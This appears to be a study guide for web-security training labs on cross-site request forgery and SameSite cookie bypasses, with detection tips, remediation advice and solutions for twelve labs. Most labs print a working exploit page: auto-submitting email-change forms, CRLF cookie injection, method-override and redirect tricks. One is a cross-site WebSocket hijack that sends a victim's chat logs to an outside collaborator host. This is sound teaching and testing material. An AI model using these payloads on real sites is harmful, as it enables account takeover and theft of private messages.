## 1. Vulnerability Core

- **Vulnerability Type:** Cross-Site Request Forgery (CSRF)
    
- **Core Meaning:** CSRF is a web security vulnerability that allows an attacker to induce an authenticated user to perform unintended, malicious actions. It exploits the implicit trust relationship that a web application has with the user's browser, essentially hijacking the active user session.
    
- **The Downstream Pivot:** Because the victim's browser automatically appends session cookies to requests destined for the target site (regardless of where the request originates), the application cannot differentiate between a legitimate form submission and a forged state-changing request executed silently in the background of an attacker-controlled web page.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding CSRF vulnerabilities involves auditing state-changing requests (like `POST`, `PUT`, or `DELETE` endpoints) that manipulate user profiles, configuration properties, or financial assets.

### Identifying High-Risk Code Features

- **Profile & Identity Adjustments:** Functional forms handling account alterations such as `/my-account/change-email` or `/user/password-reset`.
    
- **Transaction Gateways:** Paths processing automated e-commerce updates, payment execution flows, or access-privilege updates.
    
- **Missing Anti-CSRF Parameters:** Network transactions that rely solely on standard cookie verification elements without explicitly tying an unpredictable token identifier to the transaction payload.
    

### Active Probing Strategy

- **Drop Cryptographic Inputs:** Strip parameters designed to carry validation tokens (e.g., deleting a parameter named `csrf` or `_token`) to see if the server ignores missing verification structures.
    
- **Mutate HTTP Request Methods:** Convert a standard state-altering `POST` submission block into a generic `GET` line string to see if the backend application accepts the arguments via query parameters.
    
- **Examine Cookie Scoping Policies:** Inspect the application's session cookies for explicit `SameSite` flags. If the cookie lacks a defined scope, default browser properties might allow unrestricted transmission across third-party site frames.
    

## 3. Classifications (The Scenarios)

- **Classic Unprotected Form Submission:** The target application features critical state modifications with predictable parameter elements and zero token protections.
    
- **Method-Dependent Validation Overrides:** Anti-CSRF token verification routines only fire when processing `POST` requests, allowing attackers to perform actions by passing parameters in the query string of a `GET` request.
    
- **Conditional Token Enforcement:** The server strictly verifies token validity if the parameter is explicitly passed, but entirely bypasses validation if the parameter container name is omitted from the request body.
    
- **Global Pool Token Swapping:** The application tracks issued tokens within a generic, non-attributed database layout instead of binding tokens specifically to an active individual user session. This lets an attacker use a token harvested from their own valid login session to authorize an attack against a victim.
    

## 4. Remediation

- **Implement Cryptographic Anti-CSRF Tokens:** Ensure every state-altering request mandates a unique, secret, and cryptographically strong token tied explicitly to the user's active server-side session.
    
- **Enforce Strict SameSite Cookie Properties:** Standardize session infrastructure cookie configuration sets to leverage `SameSite=Lax` or `SameSite=Strict` attributes to block third-party data tracking attachment transfers.


### Lab 1: CSRF vulnerability with no defenses

- **Attack Vector:** An email alteration route processes inputs using predictable names while relying completely on standard cookie authentication mechanisms.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. Intercept the update email form submission to find the destination path.
     
 2. Construct a hidden HTML payload configuration inside your exploit server. The form executes automatically when a victim loads the page, updating their account email:
     
     HTML
     
     ```
     <html>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
           <input type="hidden" name="email" value="pwned@evil-user.net" />
         </form>
         <script>
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```
     

### Lab 2: CSRF where token validation depends on request method

- **Attack Vector:** The server checks for the presence of a valid `csrf` parameter when handling `POST` requests, but skips validation checks when the parameters arrive via a `GET` query layout.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN

 **Exploitation Routine (Payload):**
 
 1. Use Burp Suite's right-click context menu option **Change request method** to convert the standard email update `POST` block into an alternative `GET` structure. Observe that the transaction passes validation without requiring a proper token.
     
 2. Package the execution script inside an HTML payload layout that triggers a `GET` request using standard form fields:
     
     HTML
     
     ```
     <html>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
           <input type="hidden" name="email" value="pwned-method@evil-user.net" />
         </form>
         <script>
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```
     

### Lab 3: CSRF where token validation depends on token being present

- **Attack Vector:** The application screens the accuracy of incoming `csrf` token keys but lets the entire request pass if the parameter key container itself is deleted from the transmission stream.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. Intercept a valid update request. In Burp Repeater, remove the `csrf=...` parameter block completely from the request body and verify that the server processes the email change successfully.
     
 2. Deploy a clean HTML exploit payload to the victim. Since the server does not enforce token presence, omitting the field from the form ensures the request is processed smoothly:
     
     HTML
     
     ```
     <html>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
                     <input type="hidden" name="email" value="pwned-absent@evil-user.net" />
         </form>
         <script>
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```

## . Detection & Attack Surface Mapping (In the Wild)

To detect advanced CSRF validation flaws and SameSite bypass configurations during real-world black-box assessments, utilize the following testing methodology:

### Identifying High-Risk Code Features

- **Decoupled Security Frameworks:** Applications combining distinct middleware stacks (e.g., handling authentication sessions via one framework while managing CSRF validations through another standalone library).
    
- **Reflected Input Parameters:** Search or error forms that echo raw string inputs inside response headers, as these are primary targets for CRLF (Carriage Return Line Feed) injection to force `Set-Cookie` updates.
    
- **Implicit SameSite Fallbacks:** State-changing requests processing cookies that completely omit explicit `SameSite` declarations within their structural `Set-Cookie` directives.
    

### Active Probing Strategy

- **Cross-Session Token Testing:** Log into two different valid accounts within separate browser sessions. Harvest a fresh anti-CSRF token from Account A and append it to a state-changing request generated within Account B to determine if tokens are globally pooled.
    
- **Cookie-to-Parameter Decoupling:** Alter the value of a CSRF verification cookie while keeping the body token parameter static. If the application handles the request normally without throwing a validation mismatch error, the keys are decoupled.
    
- **Header Parameter Manipulation:** Test for explicit framework routing tricks by appending parameter variables like `_method=POST` or `X-HTTP-Method-Override: POST` onto structural `GET` query loops.
    

## 5. Solution & Payloads

### Lab 4: CSRF where token is not tied to user session

- **Attack Vector:** The application screens the structural presence of a validation token against a central active token pool but fails to verify if the token actually maps to the unique session context of the user making the submission.
    

### **Solution & Payloads**
 
 1. Log into Account A (`wiener:peter`), navigate to the email update portal, and extract a fresh, unspent verification token parameter string value from the hidden form input layout.
     
 2. Drop or cancel that specific request transaction to ensure the harvested token remains unused and active inside the server pool.
     
 3. Construct your HTML payload structure, inserting the pristine token harvested directly from Account A as the target body field parameter value:
     
     HTML
     
     ```
     <html>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
           <input type="hidden" name="email" value="attacker-pooled@evil-user.net" />
           <input type="hidden" name="csrf" value="**HARVESTED_TOKEN_FROM_ACCOUNT_A**" />
         </form>
         <script>
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```
     
 4. Save and deploy this form payload to the target victim.
     

### Lab 5: CSRF where token is tied to non-session cookie

- **Attack Vector:** The application validates the body token parameter against a separate verification tracking cookie (`csrfKey`), rather than checking the primary authenticated session cookie. An independent CRLF injection vulnerability on the site's search form allows an attacker to plant cookies in the victim's browser.
    

### **Solution & Payloads**
 
 1. Log into Account A (`wiener:peter`) and extract both your active `csrfKey` cookie value and the current body `csrf` parameter token value.
     
 2. Use the application's search feature to locate an injection point where input parameters are reflected into response headers. Construct a CRLF sequence string to plant your personal `csrfKey` value into the client cookie container:
     
     Plaintext
     
     ```
     **/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-HARVESTED-KEY%3b%20SameSite=None**
     ```
     
 3. Create the exploit HTML page. Combine an resource element trigger string targeting the cookie injection payload with a fallback form submission rule targeting the email update form endpoint:
     
     HTML
     
     ```
     <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=**YOUR-ACCOUNT-A-csrfKey**%3b%20SameSite=None" onerror="document.forms[0].submit()">
     <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
         <input type="hidden" name="email" value="attacker-cookie-tied@evil-user.net">
         <input type="hidden" name="csrf" value="**YOUR-ACCOUNT-A-csrf-TOKEN**">
     ```
     

### Lab 6: CSRF where token is duplicated in cookie

- **Attack Vector:** The target application relies on a "double-submit" verification model. It checks if the text string passed within the body field matches the value stored in the user's `csrf` cookie container, without performing validation against a server-side record.
    

 ### Solution & Payloads
 
 1. Exploit the unvalidated search bar framework parameter to manipulate the cookie stream using raw URL-encoded carriage-return string components.
     
 2. Build your composite deployment page. The payload triggers a cookie injection that plants a arbitrary matching string (**fake**) into the user's browser, then automatically runs the state change form with the identical parameter:
     
     HTML
     
     ```
     <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=**fake**%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
     <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
         <input type="hidden" name="email" value="attacker-double-submit@evil-user.net">
         <input type="hidden" name="csrf" value="**fake**">
     </form>
     ```
     
**3**. Save the exploit structure on your host and execute the delivery attack sequence against the target user.

### Lab 7: SameSite Lax bypass via method override

- **Attack Vector:** The site sets its primary session verification cookies without an explicit SameSite property definition, leaving the browser to fall back to standard `SameSite=Lax` isolation. However, the application's underlying engine parses custom method parameter modifiers, allowing an attacker to convert a `POST` transaction into a top-level `GET` request.
    

 ### Solution & Payloads
 
 1. Audit the account adjustment interface and map out the parameters of the email update request.
     
 2. Verify that appending a custom framework parameter (`_method=POST`) directly to a `GET` request format fools the server into processing the statement as a proper form submission.
     
 3. Construct a simplified exploit script designed to perform a direct top-level location navigation, forcing the browser to include the victim's default `Lax` authenticated cookies:
     
     HTML
     
     ```
     <script>
         document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=attacker-lax-bypass@evil-user.net&**_method=POST**";
     </script>
     ```
     
 4. Save this script payload onto your exploit hosting deployment platform and click to execute delivery.



### Identifying High-Risk Code Features

- **Open Client-Side Query Routing:** Script assets (e.g., `confirmationRedirect.js`) parsing location parameters directly out of the window URL block to run pathing tasks like `window.location.href = ...`.
    
- **Cross-Origin Sibling Trusts:** API microservices configured with headers like `Access-Control-Allow-Origin: https://cms.target.com`, which signals a functional shared administrative domain hierarchy.
    
- **Implicit Cookie Lifecycles:** Web platforms that delegate cookie scoping rules entirely to native browser defaults rather than applying rigid backend initialization parameters.
    

### Active Probing Strategy

- **Trace Path Traversal in DOM Sinks:** Test navigation components for input-handling flaws by appending traversal syntax keys (`../`) directly into routing parameter keys to track if the browser handles the relative adjustments locally.
    
- **Audit Shared Sibling Spaces:** Scan exposed staging paths or management endpoints (`cms.target.com`, `dev.target.com`) within the same overarching primary registration space to find isolated script vulnerabilities like Reflected XSS.
    
- **Measure Window Timing Discrepancies:** Monitor session authentication setups during automated single sign-on transitions to isolate platforms that fail to force strict Lax-enforcement flags on fresh session components.
    

## 5. Solution & Payloads

### Lab 8: SameSite Strict bypass via client-side redirect

- **Attack Vector:** The application employs a `SameSite=Strict` rule across its primary session cookies, which drops cookies during cross-site requests. However, a local routing script on the site handling confirmation screens parses paths directly via URL variables without checking the target destination, opening up an internal redirection bypass vector.
    

### Solution & Payloads
 
 1. Authenticate to your account and verify that while the target site enforces `SameSite=Strict` cookies, the account change configuration supports execution via alternative `GET` request profiles.

 2. Leverage the unvalidated routing module at `/post/comment/confirmation` to handle local traversal paths, passing a parameter setup to navigate back into account editing scripts:
     
     Plaintext
     
     ```
     **/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker-strict-dom@evil-user.net%26submit=1**
     ```
     
 3. Build an exploit framework layout that initiates a top-level location transfer to trigger the vulnerable DOM routing gadget:
     
     HTML
     
     ```
     <script>
         document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=**attacker-strict-dom@evil-user.net%26submit=1**";
     </script>
     ```
     
 4. Host the code payload and transmit the delivery package to the targeted user.

### Lab 9: SameSite Strict bypass via sibling domain

- **Attack Vector:** The target chat framework uses a `SameSite=Strict` setup on its primary server cookies, making it immune to basic cross-site WebSocket hijacking (CSWSH) attempts. However, a sub-domain infrastructure workspace sharing the same root space contains an unvalidated, reflected parameter input flaw that accepts functional JavaScript payloads.
    

 ### Solution & Payloads
 
 1. Audit the backend asset origins and locate the alternative operational domain space at `cms-YOUR-LAB-ID.web-security-academy.net`.
     
 2. Discover an unvalidated argument reflection pattern on the portal login script page, verifying that it accepts and runs functional XSS text modules.
     
 3. Craft a specialized client script designed to hook the primary backend WebSocket listener and exfiltrate raw chat logs out to a private remote handler:
     
     JavaScript
     
     ```
     var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
     ws.onopen = function() { ws.send("READY"); };
     ws.onmessage = function(event) {
         fetch('https://YOUR-COLLABORATOR-ID.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
     };
     ```
     
 4. URL-encode this script sequence completely and nest the resulting block inside an account navigation exploit vector targeting the victim:
     
     HTML
     
     ```
     <script>
         document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=**%3Cscript%3Evar%20ws%3Dnew%20WebSocket%28%27wss%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Fchat%27%29%3Bws.onopen%3Dfunction%28%29%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage%3Dfunction%28event%29%7Bfetch%28%27https%3A%2F%2FYOUR-COLLABORATOR-ID.oastify.com%27%2C%7Bmethod%3A%27POST%27%2Cmode%3A%27no-cors%27%2Cbody%3Aevent.data%7D%29%3B%7D%3B%3C%2Fscript%3E**&password=anything";
     </script>
     ```
     
 5. Store the payload script page and execute the transmission chain against the target account.
     

### Lab 10: SameSite Lax bypass via cookie refresh

- **Attack Vector:** The target application relies on a default, unconfigured browser `SameSite=Lax` cookie implementation model. Because of this default behavior, Chrome implements a temporary 120-second exemption window where newly issued authentication tokens are passed during top-level `POST` requests to support single sign-on interactions.
    

 ### Solution & Payloads
 
 1. Trace the site single-sign-on path and note that initiating a request to `/social-login` triggers a transparent, automated re-authentication sequence that issues fresh, active session credentials.
     
 2. Construct an interactive layout configuration that forces the victim to initiate a page interaction, bypassing native browser popup security filters before launching the target form payload:
     
     HTML
     
     ```
     <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
         <input type="hidden" name="email" value="**attacker-lax-refresh@evil-user.net**">
     </form>
     <p>Click anywhere on the page</p>
     <script>
         window.onclick = () => {
             window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
             setTimeout(changeEmail, 5000);
         }
         function changeEmail() {
             document.forms[0].submit();
         }
     </script>
     ```
     
 3. Save the payload to the exploit server and deliver the attack to the victim.

To detect and bypass restrictive pattern matching within `Referer` validation components during real-world black-box testing, include the following analysis steps:

### Identifying High-Risk Code Features

- **Fallback Validation Blocks:** Security configurations that execute state-changing operations when a verification header is absent rather than throwing a hard exception.
    
- **Naive Substring Matching:** Validation code using regex or substring methods (e.g., `contains()`, `indexOf()`, or basic trailing matches) to check headers, rather than parsing the origin strictly using dedicated URL-parsing libraries.
    

### Active Probing Strategy

- **Complete Header Removal:** Strip out the `Referer` or `Origin` header blocks from request transmissions to check if the destination validation layer permits unmonitored execution.
    
- **Inject Target Suffixes and Query Delimiters:** Modify the domain in the validation header to include the target domain in non-standard sections (e.g., `https://attacker.com?target.com` or `https://target.com.attacker.com`).
    
- **Enforce Global Referrer Overrides:** Audit the application's global `Referrer-Policy` headers. If the application or client environment defaults to stripping query parameters, use cross-origin deployment tactics to force full URL delivery.
    

## 5. Solution & Payloads

### Lab 11: CSRF where Referer validation depends on header being present

- **Attack Vector:** The server validates the origin via the incoming `Referer` header. It blocks modifications coming from external domains, but skips this restriction entirely if the `Referer` header is missing.
    

### Solution & Payloads

 1. Intercept a valid email change request and verify inside Burp Repeater that removing the `Referer` header completely causes the application to accept the modification.
     
 2. Construct an HTML exploit document that uses a specific metadata tag to tell the browser to strip out all origin-tracking references before executing the form transmission:
     
     HTML
     
     ```
     <html>
       <head>
         <meta name="referrer" content="no-referrer">
       </head>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
           <input type="hidden" name="email" value="**attacker-no-referer@evil-user.net**" />
         </form>
         <script>
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```
     
 3. Host this document and deliver it to the target victim.
     

### Lab 12: CSRF with broken Referer validation

- **Attack Vector:** The server naively checks the `Referer` string by looking for the target lab domain _anywhere_ inside the URL string. This allows an attacker to bypass the check by appending the victim's domain as a query parameter.
    

 ### Solution & Payloads
 
 1. Verify the validation gap by appending the target lab domain string into an arbitrary query location within your header: `Referer: https://evil.net?YOUR-LAB-ID.web-security-academy.net`.
     
 2. To build an exploit that appends this query string to the browser's outbound header, use `history.pushState()` to append parameters to the address bar before the form submits.
    
 3. Because modern browsers strip query strings from cross-origin requests by default, you must explicitly add a `Referrer-Policy: unsafe-url` response header in the exploit server's configuration block.
     
 4. Deploy the following payload in the body section of your exploit server:
     
     HTML
     
     ```
     <html>
       <body>
         <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
           <input type="hidden" name="email" value="**attacker-broken-referer@evil-user.net**" />
         </form>
         <script>
           history.pushState("", "", "**/?YOUR-LAB-ID.web-security-academy.net**");
           document.forms[0].submit();
         </script>
       </body>
     </html>
     ```
     
 5. Store and deliver the link to the target user.


